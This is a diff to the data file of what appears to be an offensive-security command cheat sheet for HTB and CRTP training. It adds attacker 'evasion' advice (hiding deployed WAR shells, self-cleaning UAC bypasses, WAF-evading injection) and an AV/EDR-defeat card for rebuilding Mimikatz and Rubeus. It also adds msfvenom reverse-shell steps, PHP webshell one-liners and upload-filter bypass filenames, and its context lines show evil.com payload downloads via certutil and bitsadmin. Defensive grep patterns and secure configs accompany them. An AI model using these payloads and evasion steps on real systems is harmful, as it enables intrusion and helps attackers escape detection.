@@ -73268,7 +77050,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1595.002",
           "OWASP A05:2021"
-        ]
+        ],
+        "evasion": "Undeploy the malicious WAR after getting a shell; name it innocuously; manager access over a valid session looks like admin activity."
       }
     },
     {
@@ -73359,7 +77142,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1083",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -73562,7 +77346,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1110",
           "OWASP A07:2021"
-        ]
+        ],
+        "evasion": "Undeploy the malicious WAR after getting a shell; name it innocuously; manager access over a valid session looks like admin activity."
       }
     },
     {
@@ -73626,6 +77411,11 @@ const COMMAND_DATA = {
           "id": "tomcat-war-webshell",
           "note": "Interactive command-webshell alternative.",
           "rel": "alternative"
+        },
+        {
+          "id": "gs-tty-upgrade",
+          "rel": "next",
+          "note": "Stabilize the WAR-deployed shell"
         }
       ],
       "id": "tomcat-msfvenom-war",
@@ -73652,7 +77442,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1505.003",
           "MITRE T1190"
-        ]
+        ],
+        "evasion": "Undeploy the malicious WAR after getting a shell; name it innocuously; manager access over a valid session looks like admin activity."
       }
     },
     {
@@ -73753,8 +77544,105 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1059",
           "OWASP A03:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort.",
+        "evasion": "Keep the injected command short and single-shot; URL-encode to slip past naive WAF signatures; pull a full shell over a separate channel."
       }
+    },
+    {
+      "id": "crtp-tool-obfuscation",
+      "name": "Tool Obfuscation Tradecraft (Codecepticon / Mimikatz rebuild)",
+      "command": "Codecepticon.exe --action obfuscate --module csharp --path <solution> --map-file <map_file>",
+      "description": "Rebuild offensive tooling so signature-based AV/EDR no longer recognizes it. Codecepticon obfuscates C# (Loader/Rubeus/SafetyKatz) and PowerShell (Invoke-Mimikatz) source; Invoke-UpdateMimikatzScript refreshes the embedded Mimikatz DLL in Invoke-Mimikatz.ps1; a custom AES generator re-encrypts strings. Reference for the CRTP 'defeat AV' workflow.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Evasion",
+      "type": "reference",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "silent",
+      "mitre": [
+        "T1027",
+        "T1140",
+        "T1587.001"
+      ],
+      "tools": [
+        "Codecepticon",
+        "Invoke-UpdateMimikatzScript",
+        "PowerShell"
+      ],
+      "tags": [
+        "obfuscation",
+        "av-evasion",
+        "tool-development",
+        "codecepticon",
+        "mimikatz",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Obfuscate a C# project (Loader/Rubeus)",
+          "command": "Codecepticon.exe --action obfuscate --module csharp --verbose --path <solution> --map-file <map_file>"
+        },
+        {
+          "label": "Obfuscate a PowerShell script (Invoke-Mimikatz)",
+          "command": "Codecepticon.exe --action obfuscate --module powershell --verbose --path <script_ps1> --map-file <map_file>"
+        },
+        {
+          "label": "Refresh the embedded Mimikatz DLL in the PS wrapper",
+          "command": "Invoke-UpdateMimikatzScript -DllPath <dll_file> -ScriptPath .\\Invoke-Mimikatz.ps1"
+        },
+        {
+          "label": "Locate a flagged byte offset in a script",
+          "command": ".\\ByteToLineNumber.ps1 <script_ps1> <0xNNN>"
+        },
+        {
+          "label": "Regenerate AES-encrypted strings",
+          "command": ".\\CustomAES-Generator-Encryption.ps1 > enc.txt"
+        },
+        {
+          "label": "Find the flagged bytes with DefenderCheck",
+          "command": "DefenderCheck.exe <binary_or_script>"
+        },
+        {
+          "label": "Compile/execute via LOLBAS (csc.exe / MSBuild.exe)",
+          "command": "MSBuild.exe <inline_task>   # or: csc.exe /out:<out_exe> <source_cs>"
+        }
+      ],
+      "notes": "Workflow when a signatured tool gets caught: (1) find what's flagged - AMSI/Defender byte offset -> ByteToLineNumber.ps1 maps it to a source line; (2) obfuscate the source with Codecepticon (renames symbols, encrypts strings) and rebuild; (3) for Invoke-Mimikatz, swap in a fresh/obfuscated powerkatz.dll via Invoke-UpdateMimikatzScript. Use the resulting binaries with crtp-loader (in-memory) and the PS scripts inside crtp-invishell. Reference card - no single command; see the linked tools. DefenderCheck locates the exact bytes Windows Defender flags; map the offset to a source line with ByteToLineNumber.ps1, then obfuscate that part. csc.exe/MSBuild.exe (LOLBAS) compile/run code inline to bypass application control (UMCI/AppLocker).",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "Codecepticon (GitHub)",
+          "url": "https://github.com/Accenture/Codecepticon"
+        },
+        {
+          "title": "MITRE ATT&CK T1027 - Obfuscated Files or Information",
+          "url": "https://attack.mitre.org/techniques/T1027/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-loader",
+          "note": "Run the rebuilt C# assemblies in-memory",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-invishell",
+          "note": "Run obfuscated PowerShell inside the cloaked shell",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-amsi-sbl-bypass",
+          "note": "Pair obfuscation with runtime AMSI/logging bypass",
+          "rel": "alternative"
+        }
+      ]
     },
     {
       "type": "command",
@@ -73958,7 +77846,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -74062,7 +77951,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credentials are stored in plaintext in browser saved passwords, application config files, scripts, log files, and SMB shares. Network captures contain cleartext protocol credentials (FTP, HTTP Basic, LDAP simple bind). No DLP (Data Loss Prevention) monitoring prevents credential exfiltration.",
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
-        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
+        "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud",
+        "evasion": "Read files directly instead of staging tools; scope the search to likely directories; where a tool binary is signatured, copy the artifact off-host and process it on your box."
       }
     },
     {
@@ -74350,7 +78240,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1548.002",
           "MITRE T1082"
-        ]
+        ],
+        "evasion": "Use a fileless UAC bypass (fodhelper/registry) that self-cleans; remove the added registry keys after elevation."
       }
     },
     {
@@ -74439,7 +78330,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1548.002"
-        ]
+        ],
+        "evasion": "Use a fileless UAC bypass (fodhelper/registry) that self-cleans; remove the added registry keys after elevation."
       }
     },
     {
@@ -74532,6 +78424,11 @@ const COMMAND_DATA = {
           "id": "crtp-golden-ticket",
           "note": "Create golden ticket after krbtgt dump",
           "rel": "next"
+        },
+        {
+          "id": "crtp-coercion",
+          "note": "Coerce the DC to authenticate (printerbug/DFSCoerce) to capture its TGT",
+          "rel": "next"
         }
       ],
       "notes": "Requires SYSTEM on unconstrained host. SpoolService (printer bug) forces DC to authenticate back. Use Petitpotam as alternative trigger.",
@@ -74616,10 +78513,6 @@ const COMMAND_DATA = {
       "category": "Exploitation",
       "subcategory": "Interactive Shells",
       "variations": [
-        {
-          "label": "python pty",
-          "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
-        },
         {
           "label": "script",
           "command": "/usr/bin/script -qc /bin/bash /dev/null"
@@ -74716,7 +78609,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces — should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
-        "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
+        "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services",
+        "evasion": "Prefer encrypted/HTTPS callbacks, migrate out of the initial process quickly, and avoid signatured default payloads."
       }
     },
     {
@@ -74811,8 +78705,27 @@ const COMMAND_DATA = {
         "why_it_works": "Extension blacklists (block .php, .php7, .phps) are incomplete — dozens of alternative extensions execute as PHP depending on server configuration: .phtml, .php5, .pht, .phar, .phpt. If Apache's FilesMatch directive or MIME type mapping includes any of these, the uploaded file executes. Burp Intruder fuzzes through extension lists (PayloadsAllTheThings) to find which ones the server accepts and executes.",
         "impact": "Same as webshell upload — RCE via an extension the developer forgot to blacklist. A single missed extension in the blacklist completely defeats the control.",
         "detection": "[MITRE T1505.003] WAF: upload of alternative PHP extensions. Application: any non-allowlisted extension reaching the upload handler. FIM: .phtml, .phar, .php5 files appearing in upload directory.",
-        "artifacts": "Upload directory: shell.phtml or shell.php5. Access log: Burp Intruder fuzzing — many upload requests with different extensions in rapid succession."
-      }
+        "artifacts": "Upload directory: shell.phtml or shell.php5. Access log: Burp Intruder fuzzing — many upload requests with different extensions in rapid succession.",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
+      },
+      "variations": [
+        {
+          "label": "Alternate PHP extensions",
+          "command": "shell.phtml  |  shell.php5  |  shell.phar  |  shell.pht"
+        },
+        {
+          "label": "Double extension",
+          "command": "shell.jpg.php"
+        },
+        {
+          "label": "Null byte (old PHP)",
+          "command": "shell.php%00.jpg"
+        },
+        {
+          "label": "Case / trailing char",
+          "command": "shell.PhP  |  shell.php."
+        }
+      ]
     },
     {
       "id": "upload-client-side-bypass",
@@ -74898,8 +78811,15 @@ const COMMAND_DATA = {
         "why_it_works": "Client-side validation (JavaScript checkFile() function, HTML accept= attribute) runs entirely in the browser. The attacker modifies the page HTML via DevTools (removing the onchange handler or accept attribute) or intercepts the upload request with Burp Suite and changes the filename or Content-Type before it reaches the server. Server-side validation never sees the original client restriction.",
         "impact": "Bypasses all client-side file type restrictions — allows uploading arbitrary files including PHP webshells to applications that appear to only accept images. This is the entry point for all server-side bypass chains.",
         "detection": "[MITRE T1505.003] Server-side only — client-side validation leaves no server-log trace when bypassed. Detection: file extension in uploaded filename doesn't match Content-Type header (Burp-modified request signature). WAF: file upload with PHP extension despite image Content-Type.",
-        "artifacts": "Access log: upload request with PHP filename but image/jpeg Content-Type (Burp bypass signature). Server: uploaded file with unexpected extension in upload directory."
-      }
+        "artifacts": "Access log: upload request with PHP filename but image/jpeg Content-Type (Burp bypass signature). Server: uploaded file with unexpected extension in upload directory.",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
+      },
+      "variations": [
+        {
+          "label": "Intercept + swap content-type",
+          "command": "# Burp: change Content-Type to image/png, keep .php filename"
+        }
+      ]
     },
     {
       "id": "upload-type-filter-bypass",
@@ -74966,10 +78886,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Magic bytes (GIF)",
-          "command": "GIF8\n<?php system($_REQUEST['cmd']); ?>"
-        },
-        {
           "label": "Content-Type header",
           "command": "Content-Type: image/jpeg"
         }
@@ -74996,7 +78912,8 @@ const COMMAND_DATA = {
         "why_it_works": "Content-Type validation checking $_FILES['uploadFile']['type'] reads the MIME type from the HTTP request headers — attacker-controlled. Changing Content-Type: application/x-php to Content-Type: image/jpeg in Burp bypasses the check while the file content remains a PHP webshell. Magic-byte validation (mime_content_type()) reads the actual file bytes — bypassed by prepending GIF8 (or JPEG magic bytes \\xFF\\xD8\\xFF\\xE0) before the PHP code. The file passes MIME detection as a GIF but PHP still executes the <?php ?> tags that follow.",
         "impact": "Bypasses MIME type and magic byte validation — the last line of defense for many upload implementations. After bypass, webshell upload and execution proceeds as normal.",
         "detection": "[MITRE T1505.003] Content inspection: scan uploaded file content for PHP tags regardless of MIME type detection result. Use both mime_content_type() AND scan for PHP open tags. AV on upload directory catches webshell signatures even inside image magic-byte-prefixed files.",
-        "artifacts": "Upload directory: file with GIF8 header followed by PHP code. Access log: upload request with image/jpeg Content-Type but PHP execution later. AV alert: PHP code in GIF/JPEG file."
+        "artifacts": "Upload directory: file with GIF8 header followed by PHP code. Access log: upload request with image/jpeg Content-Type but PHP execution later. AV alert: PHP code in GIF/JPEG file.",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -75087,10 +79004,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Command injection",
-          "command": "file$(whoami).jpg"
-        },
-        {
           "label": "SQL injection",
           "command": "file';select+sleep(5);--.jpg"
         },
@@ -75125,7 +79038,8 @@ const COMMAND_DATA = {
         "why_it_works": "The filename from the multipart upload form is often used in server-side operations without sanitization: SQL queries (INSERT INTO uploads SET name='FILENAME' — SQL injection via 'sleep(5);--), OS commands (move files, extract archives — command injection via file$(whoami).jpg), or reflected in HTML without encoding (XSS via <img src=1 onerror=alert()>.jpg). The developer trusts the filename as user input when it should be treated as hostile.",
         "impact": "SQL injection via filename: database manipulation, data exfiltration. Command injection via filename: OS command execution if the filename is passed to exec/system. XSS via filename: session theft if filename is reflected in an HTML response.",
         "detection": "[MITRE T1505.003] Application: never use the original filename in SQL queries or OS commands — generate a random filename server-side. Sanitize filename before display. Use parameterized queries for any DB operation involving the filename. basename() to strip path traversal. Alphanumeric+extension allowlist for filename characters.",
-        "artifacts": "Access log: upload requests with unusual filenames (SQL metacharacters, shell metacharacters, HTML tags). Application log: SQL errors or command execution triggered by malicious filename."
+        "artifacts": "Access log: upload requests with unusual filenames (SQL metacharacters, shell metacharacters, HTML tags). Application log: SQL errors or command execution triggered by malicious filename.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       }
     },
     {
@@ -75224,8 +79138,33 @@ const COMMAND_DATA = {
         "why_it_works": "A reverse shell PHP file (pentestmonkey's php-reverse-shell or msfvenom output) is uploaded and accessed via HTTP. The server executes it, which opens an outbound TCP connection to the attacker's listener (netcat/msf). The attacker receives a full interactive shell without relying on a command-in-URL webshell — useful when the upload directory doesn't reflect HTTP responses or when interactive shell is needed.",
         "impact": "Interactive reverse shell as web server user — full terminal access. Attacker can enumerate the system, read files, install persistence, and pivot to internal networks. More capable than a simple webshell.",
         "detection": "[MITRE T1505.003] Network: outbound TCP connection from web server process to external IP on non-standard port. Firewall: egress filtering blocks outbound connections from www-data. Process audit: PHP spawning /bin/bash or /bin/sh. FIM: new PHP file in upload directory.",
-        "artifacts": "Upload directory: reverse-shell.php. Network connection log: outbound TCP to attacker IP. Process list at time of execution: php spawning shell process."
-      }
+        "artifacts": "Upload directory: reverse-shell.php. Network connection log: outbound TCP to attacker IP. Process list at time of execution: php spawning shell process.",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
+      },
+      "variations": [
+        {
+          "label": "PHP one-liner webshell",
+          "command": "echo '<?php system($_GET[0]); ?>' > shell.php"
+        },
+        {
+          "label": "ASPX (IIS)",
+          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f aspx -o shell.aspx"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Generate the payload",
+          "command": "msfvenom -p php/reverse_php LHOST=<lhost> LPORT=<lport> -f raw > shell.php"
+        },
+        {
+          "label": "Upload it (bypass filters as needed)",
+          "command": "# see upload-blacklist-bypass / upload-client-side-bypass"
+        },
+        {
+          "label": "Trigger it + catch the shell",
+          "command": "nc -lvnp <lport> ; curl http://<ip>/uploads/shell.php"
+        }
+      ]
     },
     {
       "id": "upload-svg-xss",
@@ -75318,7 +79257,8 @@ const COMMAND_DATA = {
         "why_it_works": "SVG files are XML documents that support embedded JavaScript via <script> tags. When an SVG is uploaded and served directly by the web server with content-type image/svg+xml, the browser parses it as HTML/XML and executes any <script> elements. An SVG with <script>alert(window.origin);</script> executes JavaScript in the context of the hosting domain — a stored XSS.",
         "impact": "Stored XSS via SVG upload — all users who view the SVG (directly or embedded in a page) execute the attacker's JavaScript. Session hijacking, credential theft, admin account takeover.",
         "detection": "[MITRE T1059.007] Content inspection: parse uploaded SVG XML and detect script tags or event handlers. Server: never serve SVG with image/svg+xml if script execution is a concern — serve as application/octet-stream or use Content-Disposition: attachment. CSP: script-src 'self' blocks inline scripts in SVG.",
-        "artifacts": "Upload directory: .svg file containing <script> tag. Access log: direct requests to the SVG URL from victim browsers. CSP violation report if CSP deployed."
+        "artifacts": "Upload directory: .svg file containing <script> tag. Access log: direct requests to the SVG URL from victim browsers. CSP violation report if CSP deployed.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -75381,10 +79321,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "PHP",
-          "command": "<?php system($_REQUEST['cmd']); ?>"
-        },
-        {
           "label": "PHP (echo test)",
           "command": "<?php system('hostname'); ?>"
         },
@@ -75415,7 +79351,8 @@ const COMMAND_DATA = {
         "why_it_works": "When a web application stores uploaded files in a web-accessible directory and the web server executes PHP (or ASP.NET, JSP) files in that directory, uploading a webshell (<?php system($_REQUEST['cmd']); ?>) gives the attacker OS command execution. The webshell is accessed via HTTP; the cmd parameter is passed to system() and the output returned in the HTTP response. Absent validation means no filename, extension, or content check is performed.",
         "impact": "Full OS command execution as the web server user (www-data). File read/write, process execution, network pivoting. With sudo misconfiguration or SUID binary, escalates to root. Webshell provides persistent access until removed.",
         "detection": "[MITRE T1505.003] File integrity monitoring: new .php file appearing in upload directory. Web access log: requests to uploaded file with ?cmd= parameter. AV scan of upload directory: PHP webshell signatures. Application log: new file creation in uploads/ by web process. IDS: PHP code keywords in HTTP request body.",
-        "artifacts": "Upload directory: shell.php file. Web access log: GET /uploads/shell.php?cmd=id. File timestamps: recently created PHP file in upload directory."
+        "artifacts": "Upload directory: shell.php file. Web access log: GET /uploads/shell.php?cmd=id. File timestamps: recently created PHP file in upload directory.",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -75486,10 +79423,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Double extension",
-          "command": "shell.jpg.php"
-        },
-        {
           "label": "Reverse double ext",
           "command": "shell.php.jpg"
         },
@@ -75520,7 +79453,8 @@ const COMMAND_DATA = {
         "why_it_works": "A weak whitelist regex (preg_match('^.*\\.(jpg|jpeg|png|gif)')) without anchoring ($) matches shell.jpg.php because the regex finds .jpg anywhere in the filename. The file is accepted as valid but the web server executes it as PHP (the final extension .php takes precedence in Apache's handler mapping). Double extension and character injection (null byte, %0a, space) exploit similar logic flaws in filename parsing.",
         "impact": "Bypasses supposedly strict allowlist validation by exploiting regex anchoring bugs or filename parsing inconsistencies between the validation layer and the web server's execution decision.",
         "detection": "[MITRE T1505.003] Application: validate extension using strict regex with $ anchor AND pathinfo() to extract only the final extension, not the full filename. FIM: any file in upload directory with multiple extensions or unusual characters in filename.",
-        "artifacts": "Upload directory: shell.jpg.php file. Access log: Burp Intruder requests with double-extension payload list."
+        "artifacts": "Upload directory: shell.jpg.php file. Access log: Burp Intruder requests with double-extension payload list.",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       }
     },
     {
@@ -75614,7 +79548,8 @@ const COMMAND_DATA = {
         "why_it_works": "exiftool injects arbitrary text into JPEG EXIF metadata fields (Comment, Artist, Copyright). If the web application reads and displays metadata from uploaded images without HTML encoding (e.g., showing 'Uploaded by: <metadata_value>'), the XSS payload in the EXIF field executes in the viewer's browser. The EXIF payload survives image re-upload because most processing pipelines don't strip metadata.",
         "impact": "Stored XSS via image metadata — every user who views the image details page is XSS'd. Session cookie theft, account takeover of any user viewing the infected file details. Often reaches admin users who review uploaded content.",
         "detection": "[MITRE T1059.007] Content inspection: scan EXIF metadata for HTML/JS content before display. Output encoding: always htmlspecialchars() when displaying metadata fields. ExifTool can also strip all metadata on upload (exiftool -all= file.jpg).",
-        "artifacts": "EXIF Comment field: HTML/JS payload visible with exiftool. Application: unencoded EXIF field in rendered HTML. Web access log: upload of image followed by XSS execution in admin/review context."
+        "artifacts": "EXIF Comment field: HTML/JS payload visible with exiftool. Application: unencoded EXIF field in rendered HTML. Web access log: upload of image followed by XSS execution in admin/review context.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
